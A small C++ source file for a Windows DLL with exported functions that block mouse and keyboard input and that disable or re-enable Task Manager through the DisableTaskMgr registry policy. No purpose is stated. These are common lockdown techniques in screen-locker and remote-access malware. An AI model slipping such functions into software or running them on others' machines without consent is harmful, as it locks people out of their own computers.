#include <windows.h>
#include <winreg.h>

extern "C" {

// Blocks or unblocks user input (mouse & keyboard)
__declspec(dllexport) bool block_input(bool enable) {
    return BlockInput(enable);
}

// Disables Task Manager via Windows Registry
__declspec(dllexport) bool disable_taskmgr() {
    HKEY hKey;
    DWORD value = 1;
    
    if (RegCreateKeyEx(HKEY_CURRENT_USER,
            TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"),
            0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, NULL) != ERROR_SUCCESS) {
        return false;
    }

    if (RegSetValueEx(hKey, TEXT("DisableTaskMgr"), 0, REG_DWORD, 
                      reinterpret_cast<BYTE*>(&value), sizeof(value)) != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return false;
    }

    RegCloseKey(hKey);
    return true;
}

// Enables Task Manager (Restores default state)
__declspec(dllexport) bool enable_taskmgr() {
    HKEY hKey;
    DWORD value = 0;  // 0 means Task Manager is enabled

    if (RegCreateKeyEx(HKEY_CURRENT_USER,
            TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"),
            0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, NULL) != ERROR_SUCCESS) {
        return false;
    }

    if (RegSetValueEx(hKey, TEXT("DisableTaskMgr"), 0, REG_DWORD, 
                      reinterpret_cast<BYTE*>(&value), sizeof(value)) != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return false;
    }

    RegCloseKey(hKey);
    return true;
}

}
